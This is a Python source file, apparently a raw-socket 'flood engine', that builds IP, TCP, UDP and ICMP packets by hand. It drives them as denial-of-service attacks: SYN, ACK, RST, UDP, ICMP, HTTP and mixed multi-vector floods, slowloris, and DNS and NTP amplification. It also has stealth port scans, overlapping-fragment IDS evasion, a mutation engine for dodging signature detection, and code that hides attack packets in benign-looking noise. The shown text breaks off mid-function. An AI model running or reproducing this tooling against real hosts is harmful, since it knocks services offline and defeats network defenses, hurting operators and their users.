#!/usr/bin/env python3
"""
packet_engine.py
Raw socket packet construction and flood engine.
Builds real IP/TCP/UDP/ICMP packets from scratch using struct.
No scapy, no hping3 - pure Python raw sockets.
"""

import socket
import struct
import random
import time
import os
import threading
import collections
import itertools
from datetime import datetime


# ═══════════════════════════════════════════════════════════════════════════════
# CHECKSUM
# ═══════════════════════════════════════════════════════════════════════════════

def checksum(data: bytes) -> int:
    """RFC 1071 Internet checksum."""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i + 1]
        s += w
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


# ═══════════════════════════════════════════════════════════════════════════════
# IP HEADER
# ═══════════════════════════════════════════════════════════════════════════════

def build_ip_header(
    src_ip: str,
    dst_ip: str,
    proto: int,
    payload_len: int,
    ttl: int = 64,
    frag_offset: int = 0,
    flags: int = 0,
    ip_id: int = None,
    tos: int = 0,
) -> bytes:
    """
    Build a raw IPv4 header with checksum.
    flags: 0=none, 1=MoreFragments, 2=DontFragment
    frag_offset: byte offset / 8 (must be multiple of 8)
    """
    if ip_id is None:
        ip_id = random.randint(1, 65535)
    ihl = 5
    ver = 4
    tot_len = 20 + payload_len
    frag_off = (flags << 13) | (frag_offset >> 3)

    # First pass with checksum=0
    hdr = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl,
        tos,
        tot_len,
        ip_id,
        frag_off,
        ttl,
        proto,
        0,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    csum = checksum(hdr)

    # Second pass with real checksum
    hdr = struct.pack('!BBHHHBBH4s4s',
        (ver << 4) | ihl,
        tos,
        tot_len,
        ip_id,
        frag_off,
        ttl,
        proto,
        csum,
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    return hdr


# ═══════════════════════════════════════════════════════════════════════════════
# TCP HEADER
# ═══════════════════════════════════════════════════════════════════════════════

# TCP flag bitmasks
TCP_FIN  = 0x01
TCP_SYN  = 0x02
TCP_RST  = 0x04
TCP_PSH  = 0x08
TCP_ACK  = 0x10
TCP_URG  = 0x20

def build_tcp_header(
    src_ip: str,
    dst_ip: str,
    sport: int,
    dport: int,
    seq: int = None,
    ack_seq: int = 0,
    flags: int = TCP_SYN,
    window: int = 65535,
    payload: bytes = b'',
    urgent: int = 0,
) -> bytes:
    """Build TCP header with pseudo-header checksum."""
    if seq is None:
        seq = random.randint(0, 2**32 - 1)

    offset = 5  # no options
    # First pass checksum=0
    tcp_hdr = struct.pack('!HHLLBBHHH',
        sport, dport,
        seq, ack_seq,
        (offset << 4), flags,
        window, 0, urgent,
    )

    # Pseudo-header for checksum
    pseudo = struct.pack('!4s4sBBH',
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0, 6,
        len(tcp_hdr) + len(payload),
    )
    csum = checksum(pseudo + tcp_hdr + payload)

    tcp_hdr = struct.pack('!HHLLBBHHH',
        sport, dport,
        seq, ack_seq,
        (offset << 4), flags,
        window, csum, urgent,
    )
    return tcp_hdr


# ═══════════════════════════════════════════════════════════════════════════════
# UDP HEADER
# ═══════════════════════════════════════════════════════════════════════════════

def build_udp_header(
    src_ip: str,
    dst_ip: str,
    sport: int,
    dport: int,
    payload: bytes = b'',
) -> bytes:
    """Build UDP header with pseudo-header checksum."""
    length = 8 + len(payload)
    udp_hdr = struct.pack('!HHHH', sport, dport, length, 0)
    pseudo = struct.pack('!4s4sBBH',
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0, 17, length,
    )
    csum = checksum(pseudo + udp_hdr + payload)
    return struct.pack('!HHHH', sport, dport, length, csum)


# ═══════════════════════════════════════════════════════════════════════════════
# ICMP HEADER
# ═══════════════════════════════════════════════════════════════════════════════

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY   = 0
ICMP_DEST_UNREACH = 3
ICMP_TIME_EXCEEDED= 11

def build_icmp_header(
    icmp_type: int = ICMP_ECHO_REQUEST,
    code: int = 0,
    payload: bytes = b'',
    identifier: int = None,
    sequence: int = None,
) -> bytes:
    """Build ICMP header with checksum."""
    if identifier is None:
        identifier = random.randint(0, 65535)
    if sequence is None:
        sequence = random.randint(0, 65535)

    # Type/code/checksum/id/seq
    hdr = struct.pack('!BBHHH', icmp_type, code, 0, identifier, sequence)
    csum = checksum(hdr + payload)
    return struct.pack('!BBHHH', icmp_type, code, csum, identifier, sequence)


# ═══════════════════════════════════════════════════════════════════════════════
# COMPLETE PACKET BUILDERS
# ═══════════════════════════════════════════════════════════════════════════════

def syn_packet(src_ip: str, dst_ip: str, dport: int, sport: int = None,
               window: int = 65535, ttl: int = 64) -> bytes:
    """Standard SYN packet - opens a half-open connection."""
    if sport is None:
        sport = random.randint(1024, 65535)
    payload = b''
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=TCP_SYN, window=window, payload=payload)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp), ttl=ttl)
    return ip + tcp


def syn_ack_packet(src_ip: str, dst_ip: str, sport: int, dport: int,
                   seq: int = None, ack: int = None) -> bytes:
    """SYN-ACK response."""
    if seq is None: seq = random.randint(0, 2**32-1)
    if ack is None: ack = random.randint(0, 2**32-1)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           seq=seq, ack_seq=ack, flags=TCP_SYN|TCP_ACK)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def ack_packet(src_ip: str, dst_ip: str, sport: int, dport: int,
               seq: int = None, ack: int = None) -> bytes:
    """ACK flood packet - no data, just acks."""
    if seq is None: seq = random.randint(0, 2**32-1)
    if ack is None: ack = random.randint(0, 2**32-1)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           seq=seq, ack_seq=ack, flags=TCP_ACK)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def rst_packet(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    """RST packet - disrupts established connections."""
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport, flags=TCP_RST)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def fin_packet(src_ip: str, dst_ip: str, sport: int, dport: int) -> bytes:
    """FIN scan packet - used for stealthy port scanning."""
    sport = sport or random.randint(1024, 65535)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport, flags=TCP_FIN)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def xmas_packet(src_ip: str, dst_ip: str, dport: int) -> bytes:
    """XMAS scan - FIN+PSH+URG all set."""
    sport = random.randint(1024, 65535)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=TCP_FIN|TCP_PSH|TCP_URG)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def null_packet(src_ip: str, dst_ip: str, dport: int) -> bytes:
    """NULL scan - no flags set, evades many stateless filters."""
    sport = random.randint(1024, 65535)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport, flags=0x00)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def udp_packet(src_ip: str, dst_ip: str, dport: int, sport: int = None,
               payload_size: int = 512) -> bytes:
    """UDP flood packet with random payload."""
    if sport is None:
        sport = random.randint(1024, 65535)
    payload = os.urandom(payload_size)
    udp = build_udp_header(src_ip, dst_ip, sport, dport, payload)
    ip = build_ip_header(src_ip, dst_ip, 17, len(udp) + len(payload))
    return ip + udp + payload


def icmp_echo_packet(src_ip: str, dst_ip: str, payload_size: int = 56) -> bytes:
    """ICMP echo request (ping) packet."""
    payload = os.urandom(payload_size)
    icmp = build_icmp_header(ICMP_ECHO_REQUEST, 0, payload)
    ip = build_ip_header(src_ip, dst_ip, 1, len(icmp) + len(payload))
    return ip + icmp + payload


def icmp_large_packet(src_ip: str, dst_ip: str,
                      payload_size: int = 1400) -> bytes:
    """Oversized ICMP - can saturate bandwidth and trigger reassembly."""
    payload = os.urandom(payload_size)
    icmp = build_icmp_header(ICMP_ECHO_REQUEST, 0, payload)
    ip = build_ip_header(src_ip, dst_ip, 1, len(icmp) + len(payload))
    return ip + icmp + payload


def tcp_with_payload(src_ip: str, dst_ip: str, sport: int, dport: int,
                     payload: bytes, flags: int = TCP_PSH|TCP_ACK) -> bytes:
    """TCP packet carrying arbitrary application payload."""
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=flags, payload=payload)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp) + len(payload))
    return ip + tcp + payload


def http_get_packet(src_ip: str, dst_ip: str, dport: int = 80) -> bytes:
    """Craft a real HTTP GET request inside TCP."""
    sport = random.randint(1024, 65535)
    paths = [
        '/', '/index.html', '/api/data', '/search?q=' + 'A'*64,
        '/admin', '/login', '/wp-admin', '/.env', '/config',
        '/api/v1/users', '/static/main.js', '/favicon.ico',
    ]
    path = random.choice(paths)
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "curl/7.68.0",
        "python-requests/2.28.0",
        "Googlebot/2.1",
    ])
    http = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {dst_ip}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n\r\n"
    ).encode()
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=TCP_PSH|TCP_ACK, payload=http)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp) + len(http))
    return ip + tcp + http


def fragmented_packets(src_ip: str, dst_ip: str, dport: int,
                       frag_size: int = 8) -> list:
    """
    Split a TCP SYN into IP fragments.
    Some stateless firewalls can't reassemble and let frags through.
    frag_size: number of 8-byte blocks per fragment.
    """
    sport = random.randint(1024, 65535)
    payload = os.urandom(32)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=TCP_SYN, payload=payload)
    data = tcp + payload
    ip_id = random.randint(1, 65535)
    fragments = []
    offset = 0
    chunk_bytes = frag_size * 8

    while offset < len(data):
        chunk = data[offset:offset + chunk_bytes]
        more = 1 if (offset + chunk_bytes) < len(data) else 0
        ip = build_ip_header(
            src_ip, dst_ip, 6, len(chunk),
            frag_offset=offset, flags=more, ip_id=ip_id,
        )
        fragments.append(ip + chunk)
        offset += chunk_bytes

    return fragments


def overlapping_fragments(src_ip: str, dst_ip: str, dport: int) -> list:
    """
    Send overlapping fragments - can confuse IDS reassembly.
    First fragment is benign, second overlaps and overwrites with attack data.
    """
    sport = random.randint(1024, 65535)
    ip_id = random.randint(1, 65535)
    packets = []

    # Fragment 1: offset 0, 24 bytes, MORE=1
    chunk1 = os.urandom(24)
    ip1 = build_ip_header(src_ip, dst_ip, 6, 24,
                          frag_offset=0, flags=1, ip_id=ip_id)
    packets.append(ip1 + chunk1)

    # Fragment 2: offset 8 (overlaps), 32 bytes, MORE=0
    chunk2 = build_tcp_header(src_ip, dst_ip, sport, dport, flags=TCP_SYN)
    ip2 = build_ip_header(src_ip, dst_ip, 6, len(chunk2),
                          frag_offset=8, flags=0, ip_id=ip_id)
    packets.append(ip2 + chunk2)

    return packets


def ttl_expiry_probe(src_ip: str, dst_ip: str, dport: int,
                     ttl: int = 1) -> bytes:
    """Low TTL packet - generates ICMP time exceeded, reveals topology."""
    sport = random.randint(1024, 65535)
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport, flags=TCP_SYN)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp), ttl=ttl)
    return ip + tcp


def spoofed_rst(src_ip: str, dst_ip: str,
                sport: int, dport: int) -> bytes:
    """RST injection to kill an existing connection."""
    tcp = build_tcp_header(src_ip, dst_ip, sport, dport,
                           flags=TCP_RST,
                           seq=random.randint(0, 2**32-1))
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp))
    return ip + tcp


def dns_query_packet(src_ip: str, dst_ip: str,
                     domain: str = "example.com") -> bytes:
    """Craft a real DNS query over UDP port 53."""
    sport = random.randint(1024, 65535)
    # Build minimal DNS query
    txid = random.randint(0, 65535)
    flags = 0x0100  # standard query, recursion desired
    dns_hdr = struct.pack('!HHHHHH', txid, flags, 1, 0, 0, 0)
    # Encode domain name
    qname = b''
    for label in domain.split('.'):
        qname += bytes([len(label)]) + label.encode()
    qname += b'\x00'
    qtype = 1   # A record
    qclass = 1  # IN
    question = qname + struct.pack('!HH', qtype, qclass)
    dns_payload = dns_hdr + question

    udp = build_udp_header(src_ip, dst_ip, sport, 53, dns_payload)
    ip = build_ip_header(src_ip, dst_ip, 17,
                         len(udp) + len(dns_payload))
    return ip + udp + dns_payload


def ntp_monlist_packet(src_ip: str, dst_ip: str) -> bytes:
    """
    NTP monlist request - amplification factor ~600x.
    Simulates amplification attack setup.
    """
    sport = random.randint(1024, 65535)
    # NTP version 2, mode 7, request 42 (monlist)
    ntp_payload = struct.pack('!BBH', 0x17, 0x00, 42) + b'\x00' * 4
    udp = build_udp_header(src_ip, dst_ip, sport, 123, ntp_payload)
    ip = build_ip_header(src_ip, dst_ip, 17,
                         len(udp) + len(ntp_payload))
    return ip + udp + ntp_payload


# ═══════════════════════════════════════════════════════════════════════════════
# FLOOD ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class FloodStats:
    """Thread-safe statistics collector for flood operations."""

    def __init__(self):
        self._lock = threading.Lock()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time = time.time()
        self._recent_times = collections.deque(maxlen=100)

    def record(self, pkt_len: int):
        with self._lock:
            self.packets_sent += 1
            self.bytes_sent += pkt_len
            self._recent_times.append(time.time())

    def record_error(self):
        with self._lock:
            self.errors += 1

    @property
    def pps(self) -> float:
        with self._lock:
            times = list(self._recent_times)
        if len(times) < 2:
            return 0.0
        span = times[-1] - times[0]
        return len(times) / span if span > 0 else 0.0

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    def to_dict(self) -> dict:
        return {
            'packets_sent': self.packets_sent,
            'bytes_sent': self.bytes_sent,
            'errors': self.errors,
            'pps': round(self.pps, 1),
            'elapsed': round(self.elapsed, 2),
            'mbps': round(self.bytes_sent * 8 / max(self.elapsed, 0.001) / 1_000_000, 3),
        }


class RawSocket:
    """Wrapper for raw socket with automatic namespace execution."""

    def __init__(self, netns: str = None, proto: int = socket.IPPROTO_RAW):
        self.netns = netns
        self.proto = proto
        self._sock = None

    def open(self) -> bool:
        try:
            self._sock = socket.socket(
                socket.AF_INET,
                socket.SOCK_RAW,
                self.proto,
            )
            self._sock.setsockopt(
                socket.IPPROTO_IP,
                socket.IP_HDRINCL,
                1,
            )
            self._sock.settimeout(1.0)
            return True
        except Exception as e:
            return False

    def send(self, packet: bytes, dst_ip: str) -> bool:
        if not self._sock:
            return False
        try:
            self._sock.sendto(packet, (dst_ip, 0))
            return True
        except Exception:
            return False

    def close(self):
        if self._sock:
            try:
                self._sock.close()
            except:
                pass
            self._sock = None


class FloodEngine:
    """
    Main flood engine. All floods run inside a specified network namespace
    via subprocesses that open raw sockets directly.
    Supports: SYN, ACK, RST, UDP, ICMP, fragment, XMAS, NULL, mixed, slowloris.
    """

    def __init__(self, src_ip: str, dst_ip: str, netns: str = "left"):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.netns = netns
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def _worker_flood(self, build_fn, count: int, stats: FloodStats):
        """Generic flood worker thread."""
        sock = RawSocket()
        if not sock.open():
            return
        sent = 0
        while sent < count and not self._stop.is_set():
            try:
                pkt = build_fn()
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
                    sent += 1
                else:
                    stats.record_error()
            except Exception:
                stats.record_error()
        sock.close()

    def _run_threaded(self, build_fn, count: int,
                      threads: int, delay: float = 0.0) -> FloodStats:
        """Run a flood function across N threads."""
        self._stop.clear()
        stats = FloodStats()
        per_thread = max(count // threads, 1)

        def worker():
            sock = RawSocket()
            if not sock.open():
                return
            sent = 0
            while sent < per_thread and not self._stop.is_set():
                try:
                    pkt = build_fn()
                    if sock.send(pkt, self.dst_ip):
                        stats.record(len(pkt))
                        sent += 1
                    else:
                        stats.record_error()
                    if delay > 0:
                        time.sleep(delay)
                except Exception:
                    stats.record_error()
            sock.close()

        ts = [threading.Thread(target=worker, daemon=True)
              for _ in range(threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join(timeout=30)
        return stats

    # ── PUBLIC FLOOD METHODS ─────────────────────────────────────────────────

    def syn_flood(self, dport: int, count: int = 500,
                  threads: int = 4, delay: float = 0.0) -> dict:
        """
        SYN flood - fills target's half-open connection table.
        Each packet comes from a random source port, random sequence number.
        No SYN-ACK response expected - pure state exhaustion.
        """
        def build():
            return syn_packet(
                self.src_ip, self.dst_ip, dport,
                sport=random.randint(1024, 65535),
            )
        stats = self._run_threaded(build, count, threads, delay)
        return stats.to_dict()

    def ack_flood(self, dport: int, count: int = 500,
                  threads: int = 4) -> dict:
        """
        ACK flood - sends ACK packets with random sequence/ack numbers.
        Bypasses SYN-cookie defenses since no handshake needed.
        Exhausts connection tracking in stateful firewalls.
        """
        def build():
            return ack_packet(
                self.src_ip, self.dst_ip,
                random.randint(1024, 65535), dport,
            )
        stats = self._run_threaded(build, count, threads)
        return stats.to_dict()

    def rst_flood(self, dport: int, count: int = 300,
                  threads: int = 4) -> dict:
        """
        RST flood - kills any established connections on target port.
        Also useful for disrupting keep-alive connections.
        """
        def build():
            return rst_packet(
                self.src_ip, self.dst_ip,
                random.randint(1024, 65535), dport,
            )
        stats = self._run_threaded(build, count, threads)
        return stats.to_dict()

    def udp_flood(self, dport: int, count: int = 300,
                  payload_size: int = 512, threads: int = 4) -> dict:
        """
        UDP flood - no handshake, pure bandwidth saturation.
        Large payloads maximize bytes per packet.
        Target generates ICMP unreachable for each, doubling load.
        """
        def build():
            return udp_packet(
                self.src_ip, self.dst_ip, dport,
                payload_size=payload_size,
            )
        stats = self._run_threaded(build, count, threads)
        return stats.to_dict()

    def icmp_flood(self, count: int = 400, large: bool = False,
                   threads: int = 4) -> dict:
        """
        ICMP flood - ping of death variant.
        large=True sends 1400-byte payloads for max bandwidth use.
        Triggers ICMP echo replies, doubling total traffic.
        """
        def build():
            if large:
                return icmp_large_packet(self.src_ip, self.dst_ip,
                                         payload_size=random.randint(800, 1400))
            return icmp_echo_packet(self.src_ip, self.dst_ip,
                                    payload_size=random.randint(56, 120))
        stats = self._run_threaded(build, count, threads)
        return stats.to_dict()

    def fragment_flood(self, dport: int, count: int = 100) -> dict:
        """
        IP fragment flood - sends fragmented TCP SYNs.
        Stateless packet filters may let fragments through since
        they can't inspect transport headers until reassembly.
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for _ in range(count):
            if self._stop.is_set():
                break
            frags = fragmented_packets(self.src_ip, self.dst_ip, dport)
            for frag in frags:
                if sock.send(frag, self.dst_ip):
                    stats.record(len(frag))
                else:
                    stats.record_error()

        sock.close()
        return stats.to_dict()

    def xmas_scan(self, ports: list) -> dict:
        """
        XMAS scan - FIN+PSH+URG set.
        RFC 793 compliant hosts should RST on closed ports, no response on open.
        Evades many packet filters that only inspect SYN packets.
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for port in ports:
            if self._stop.is_set():
                break
            pkt = xmas_packet(self.src_ip, self.dst_ip, port)
            if sock.send(pkt, self.dst_ip):
                stats.record(len(pkt))
            else:
                stats.record_error()
            time.sleep(random.uniform(0.01, 0.05))

        sock.close()
        return stats.to_dict()

    def null_scan(self, ports: list) -> dict:
        """
        NULL scan - no flags set.
        Even stealthier than XMAS. Works against many Unix/Linux targets.
        Windows ignores null packets entirely (always appears open).
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for port in ports:
            if self._stop.is_set():
                break
            pkt = null_packet(self.src_ip, self.dst_ip, port)
            if sock.send(pkt, self.dst_ip):
                stats.record(len(pkt))
            else:
                stats.record_error()
            time.sleep(random.uniform(0.01, 0.05))

        sock.close()
        return stats.to_dict()

    def fin_scan(self, ports: list) -> dict:
        """
        FIN scan - only FIN flag set.
        Another RFC 793 compliant scan technique.
        Many firewalls pass FIN without tracking state.
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for port in ports:
            if self._stop.is_set():
                break
            pkt = fin_packet(self.src_ip, self.dst_ip,
                              random.randint(1024, 65535), port)
            if sock.send(pkt, self.dst_ip):
                stats.record(len(pkt))
            else:
                stats.record_error()

        sock.close()
        return stats.to_dict()

    def mixed_flood(self, dport: int, count: int = 600,
                    threads: int = 6) -> dict:
        """
        Multi-vector DDoS - simultaneous SYN + ACK + UDP + ICMP.
        Each thread handles a different attack vector.
        Most effective because defender must track multiple attack types.
        """
        self._stop.clear()
        stats = FloodStats()
        per = count // 4

        def syn_worker():
            sock = RawSocket()
            if not sock.open(): return
            for _ in range(per):
                if self._stop.is_set(): break
                pkt = syn_packet(self.src_ip, self.dst_ip, dport)
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
            sock.close()

        def ack_worker():
            sock = RawSocket()
            if not sock.open(): return
            for _ in range(per):
                if self._stop.is_set(): break
                pkt = ack_packet(self.src_ip, self.dst_ip,
                                  random.randint(1024, 65535), dport)
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
            sock.close()

        def udp_worker():
            sock = RawSocket()
            if not sock.open(): return
            for _ in range(per):
                if self._stop.is_set(): break
                pkt = udp_packet(self.src_ip, self.dst_ip, dport,
                                  payload_size=random.randint(128, 1024))
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
            sock.close()

        def icmp_worker():
            sock = RawSocket()
            if not sock.open(): return
            for _ in range(per):
                if self._stop.is_set(): break
                pkt = icmp_echo_packet(self.src_ip, self.dst_ip)
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
            sock.close()

        workers = [syn_worker, ack_worker, udp_worker, icmp_worker]
        # Run each worker in multiple threads
        ts = []
        for fn in workers:
            for _ in range(threads // 4 + 1):
                ts.append(threading.Thread(target=fn, daemon=True))
        for t in ts: t.start()
        for t in ts: t.join(timeout=30)

        return stats.to_dict()

    def slowloris(self, dport: int, connections: int = 20,
                  hold_secs: int = 5, interval: float = 0.5) -> dict:
        """
        Slowloris attack - opens many partial HTTP connections and holds them.
        Exhausts the server's connection pool without sending full requests.
        Very effective against servers with limited max connections.
        """
        stats = FloodStats()
        socks = []

        for _ in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.dst_ip, dport))
                # Send partial HTTP request
                s.send(
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {self.dst_ip}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    .encode()
                )
                socks.append(s)
                stats.record(128)
            except Exception:
                stats.record_error()

        # Keep connections alive by sending partial headers
        deadline = time.time() + hold_secs
        while time.time() < deadline and socks:
            alive = []
            for s in socks:
                try:
                    s.send(b"X-Keep: alive\r\n")
                    stats.record(16)
                    alive.append(s)
                except Exception:
                    stats.record_error()
            socks = alive
            time.sleep(interval)

        for s in socks:
            try: s.close()
            except: pass

        return stats.to_dict()

    def dns_amplification(self, dport: int = 53,
                          count: int = 100) -> dict:
        """
        DNS amplification simulation.
        Sends many small DNS queries - target responds with large answers.
        Real amplification would use spoofed source, but we use real src here.
        """
        domains = [
            "google.com", "cloudflare.com", "amazon.com",
            "microsoft.com", "apple.com", "facebook.com",
        ]
        def build():
            return dns_query_packet(
                self.src_ip, self.dst_ip,
                domain=random.choice(domains),
            )
        stats = self._run_threaded(build, count, 2)
        return stats.to_dict()

    def http_flood(self, dport: int = 80, count: int = 200,
                   threads: int = 4) -> dict:
        """
        HTTP GET flood - application layer attack.
        Sends valid-looking HTTP requests that require server processing.
        Harder to filter than pure packet floods since traffic looks legitimate.
        """
        def build():
            return http_get_packet(self.src_ip, self.dst_ip, dport)
        stats = self._run_threaded(build, count, threads)
        return stats.to_dict()

    def ttl_probe_sweep(self, dport: int, ttl_range: tuple = (1, 10)) -> dict:
        """
        TTL sweep - probes with incrementing TTL values (like traceroute).
        Maps network topology by triggering ICMP time-exceeded responses.
        """
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for ttl in range(ttl_range[0], ttl_range[1] + 1):
            for _ in range(3):  # 3 probes per TTL
                pkt = ttl_expiry_probe(self.src_ip, self.dst_ip, dport, ttl=ttl)
                if sock.send(pkt, self.dst_ip):
                    stats.record(len(pkt))
                time.sleep(0.1)

        sock.close()
        return stats.to_dict()

    def overlapping_fragment_flood(self, dport: int, count: int = 50) -> dict:
        """
        Overlapping fragment attack.
        Sends conflicting IP fragments. OS reassembly behavior varies -
        some use first-fragment-wins, others last-fragment-wins.
        Can bypass IDS that reassembles differently than the target OS.
        """
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for _ in range(count):
            if self._stop.is_set():
                break
            frags = overlapping_fragments(self.src_ip, self.dst_ip, dport)
            for frag in frags:
                if sock.send(frag, self.dst_ip):
                    stats.record(len(frag))
                else:
                    stats.record_error()

        sock.close()
        return stats.to_dict()

    def ntp_flood(self, count: int = 100) -> dict:
        """
        NTP monlist flood simulation.
        Sends NTP mode 7 requests - legitimate NTP servers respond
        with a list of last 600 clients (~206 bytes -> ~48KB response).
        """
        def build():
            return ntp_monlist_packet(self.src_ip, self.dst_ip)
        stats = self._run_threaded(build, count, 2)
        return stats.to_dict()

    def port_scan_fast(self, ports: list) -> dict:
        """
        Fast SYN port scan across a list of ports.
        Minimal delay, maximum coverage.
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for port in ports:
            if self._stop.is_set():
                break
            pkt = syn_packet(self.src_ip, self.dst_ip, port)
            if sock.send(pkt, self.dst_ip):
                stats.record(len(pkt))

        sock.close()
        return stats.to_dict()

    def port_scan_slow(self, ports: list,
                       min_delay: float = 3.0,
                       max_delay: float = 8.0) -> dict:
        """
        Slow decoy port scan.
        Long delays between probes attempt to evade rate-based detection.
        """
        self._stop.clear()
        stats = FloodStats()
        sock = RawSocket()
        if not sock.open():
            return stats.to_dict()

        for port in ports:
            if self._stop.is_set():
                break
            pkt = syn_packet(self.src_ip, self.dst_ip, port)
            if sock.send(pkt, self.dst_ip):
                stats.record(len(pkt))
            time.sleep(random.uniform(min_delay, max_delay))

        sock.close()
        return stats.to_dict()


# ═══════════════════════════════════════════════════════════════════════════════
# MUTATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class MutationEngine:
    """
    Mutates packet parameters to evade signature-based detection.
    Tracks which mutations succeeded and biases toward them.
    """

    def __init__(self):
        self.mutation_history = collections.deque(maxlen=200)
        self.success_counts = collections.defaultdict(int)
        self.attempt_counts = collections.defaultdict(int)

    def mutate_ttl(self) -> int:
        """Return a TTL that appears legitimate but varies."""
        bases = [64, 128, 255]
        base = random.choice(bases)
        return max(1, base - random.randint(0, 10))

    def mutate_window(self) -> int:
        """TCP window size that mimics real OS fingerprints."""
        os_windows = [
            8192,    # older Windows
            65535,   # Linux default
            29200,   # Linux tuned
            65535,   # macOS
            8760,    # FreeBSD
            1024,    # old
        ]
        return random.choice(os_windows)

    def mutate_sport(self, avoid_ports: set = None) -> int:
        """Generate ephemeral source port, optionally avoiding known ports."""
        while True:
            port = random.randint(1024, 65535)
            if avoid_ports is None or port not in avoid_ports:
                return port

    def mutate_payload_size(self, attack_type: str) -> int:
        """Return payload size based on attack type and learned success."""
        if attack_type == "udp_flood":
            sizes = [64, 128, 256, 512, 768, 1024, 1400]
        elif attack_type == "icmp_flood":
            sizes = [56, 64, 128, 512, 1024, 1400]
        else:
            sizes = [0, 64, 128]
        return random.choice(sizes)

    def mutate_fragment_size(self) -> int:
        """Fragment size in 8-byte blocks - vary to evade IDS reassembly."""
        return random.choice([3, 4, 6, 8, 12, 16])

    def mutate_packet_order(self, packets: list) -> list:
        """Randomize fragment order for evasion."""
        if len(packets) > 2:
            mid = packets[1:-1]
            random.shuffle(mid)
            return [packets[0]] + mid + [packets[-1]]
        return packets

    def record_outcome(self, mutation_key: str, success: bool):
        self.attempt_counts[mutation_key] += 1
        if success:
            self.success_counts[mutation_key] += 1
        self.mutation_history.append({
            'key': mutation_key,
            'success': success,
            'time': time.time(),
        })

    def best_mutation(self, mutation_type: str) -> str:
        """Return the mutation variant with highest success rate."""
        candidates = {k: v for k, v in self.success_counts.items()
                      if k.startswith(mutation_type)}
        if not candidates:
            return None
        return max(candidates,
                   key=lambda k: self.success_counts[k] /
                   max(self.attempt_counts[k], 1))

    def success_rate(self, mutation_key: str) -> float:
        attempts = self.attempt_counts.get(mutation_key, 0)
        successes = self.success_counts.get(mutation_key, 0)
        return successes / attempts if attempts > 0 else 0.5


# ═══════════════════════════════════════════════════════════════════════════════
# TRAFFIC PATTERN GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class TrafficPattern:
    """
    Generates realistic background traffic patterns to hide attack traffic.
    Mixes attack packets with benign-looking packets.
    """

    def __init__(self, src_ip: str, dst_ip: str):
        self.src_ip = src_ip
        self.dst_ip = dst_ip

    def noise_packet(self) -> bytes:
        """Generate a benign-looking packet."""
        choice = random.randint(0, 3)
        if choice == 0:
            # Normal SYN to common port
            return syn_packet(self.src_ip, self.dst_ip,
                               random.choice([80, 443, 22, 8080]))
        elif choice == 1:
            # Small UDP
